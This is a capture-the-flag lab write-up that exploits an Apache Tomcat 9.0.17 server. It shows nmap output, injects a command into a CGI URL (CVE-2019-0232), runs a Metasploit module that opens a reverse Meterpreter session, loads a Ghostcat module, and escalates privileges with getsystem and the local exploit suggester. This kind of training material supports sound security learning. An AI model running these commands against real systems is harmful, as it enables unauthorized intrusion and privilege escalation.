# Day 12 - Ready, set, elf. (Networking)

1. What is the version number of the web server?

    1. Run `nmap -sV -sC -Pn 10.10.53.1`:

        ```
        Nmap scan report for 10.10.53.1
        Host is up (0.14s latency).
        Not shown: 996 filtered ports
        PORT     STATE SERVICE       VERSION
        3389/tcp open  ms-wbt-server Microsoft Terminal Services
        | rdp-ntlm-info: 
        |   Target_Name: TBFC-WEB-01
        |   NetBIOS_Domain_Name: TBFC-WEB-01
        |   NetBIOS_Computer_Name: TBFC-WEB-01
        |   DNS_Domain_Name: tbfc-web-01
        |   DNS_Computer_Name: tbfc-web-01
        |   Product_Version: 10.0.17763
        |_  System_Time: 2020-12-14T00:39:43+00:00
        | ssl-cert: Subject: commonName=tbfc-web-01
        | Not valid before: 2020-12-11T21:55:21
        |_Not valid after:  2021-06-12T21:55:21
        |_ssl-date: 2020-12-14T00:39:46+00:00; 0s from scanner time.
        5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
        |_http-server-header: Microsoft-HTTPAPI/2.0
        |_http-title: Service Unavailable
        8009/tcp open  ajp13         Apache Jserv (Protocol v1.3)
        | ajp-methods: 
        |_  Supported methods: GET HEAD POST OPTIONS
        8080/tcp open  http          Apache Tomcat 9.0.17
        |_http-favicon: Apache Tomcat
        |_http-title: Apache Tomcat/9.0.17
        Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

        Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
        Nmap done: 1 IP address (1 host up) scanned in 33.32 seconds
        ```

    2. Apache Tomcat version `9.0.17` is running on port `8080`. `9.0.17` is the answer.

2. What CVE can be used to create a Meterpreter entry onto the machine? (Format: CVE-XXXX-XXXX)

    1. Running `searchsploit tomcat` finds the following:

        ```
        Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Metasploit)                                        | multiple/webapps/49039.rb
        Apache Tomcat - CGIServlet enableCmdLineArguments Remote Code Execution (Metasploit)                   | windows/remote/47073.rb

        ```

    2. Googling `Apache Tomcat 9.0.17 exploit` finds [CVE Details Tomcat 9.0.17](https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-887/version_id-280286/Apache-Tomcat-9.0.17.html) which is vulnerable to [CVE-2019-0232](https://www.cvedetails.com/cve/CVE-2019-0232/). `CVE-2019-0232` is the answer.

    3. Going to `http://10.10.53.1:8080/cgi-bin/elfwhacker.bat?&systeminfo` (`elfwhacker.bat` given in instructions) shows the `systeminfo`, output which means commands can be run using this CGI script.

3. Set your Metasploit settings appropriately and gain a foothold onto the deployed machine.

    ```
    sudo msfconsole
    search CVE-2019-0232
    use 0
    set rhosts 10.10.53.1
    set lhost tun0
    set targeturi /cgi-bin/elfwhacker.bat
    exploit
    ```

    Let's also try Ghostcat, which will let us read any file:

    ```
    mkdir -p /root/.msf4/modules/exploits/multiple/webapps/
    cp /usr/share/exploitdb/exploits/multiple/webapps/49039.rb /root/.msf4/modules/exploits/multiple/webapps/
    sudo updatedb
    sudo msfconsole
    use multiple/webapps/49039
    ```

4. What are the contents of flag1.txt? Open a shell with `shell` and run `type flag1.txt` to get `thm{whacking_all_the_elves}`

5. Looking for a challenge? Try to find out some of the vulnerabilities present to escalate your privileges! Run `getsystem` in metasploit to get `NT AUTHORITY\SYSTEM` (output of `getuid`).

    1. Local exploit suggester:

        ```
        background
        use post/multi/recon/local_exploit_suggester
        set session 1
        run
        ```

        Output:

        ```
        [*] 10.10.53.1 - Collecting local exploits for x86/windows...
        [*] 10.10.53.1 - 35 exploit checks are being tried...
        [+] 10.10.53.1 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.
        [+] 10.10.53.1 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
        [+] 10.10.53.1 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
        [*] Post module execution completed
        ```
